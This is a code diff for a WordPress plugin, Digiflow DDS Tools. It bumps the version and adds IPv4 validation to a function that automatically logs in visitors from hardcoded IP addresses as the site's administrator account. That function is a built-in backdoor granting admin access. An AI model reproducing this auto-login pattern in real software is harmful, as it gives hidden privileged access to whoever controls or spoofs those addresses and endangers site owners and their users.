@@ -1,10 +1,10 @@
 <?php
-$dds_version = "5.2";
+$dds_version = "5.2.1";
 /*
 Plugin Name: Digiflow DDS Tools
 Plugin URI: https://github.com/younesben99/dds-tools
 Description: Tools for DDS website.
-Version: 5.2
+Version: 5.2.1
 Author: Younes Benkheil
 Author URI: https://digiflow.be/
 License: GPL2
@@ -242,9 +242,9 @@ function auto_login_if_allowed_ip() {
     // Add default IP addresses to allowed_ips array
     $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98");
     $allowed_ips = array_merge($allowed_ips, $default_ips);
-    $current_ip = $_SERVER['REMOTE_ADDR'];
+    $current_ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
 
-    if (in_array($current_ip, $allowed_ips)) {
+    if ($current_ip !== false && in_array($current_ip, $allowed_ips)) {
       $user = get_user_by('login', 'admin');
       if (!$user) {
         $user = get_user_by('login', 'digiflow');
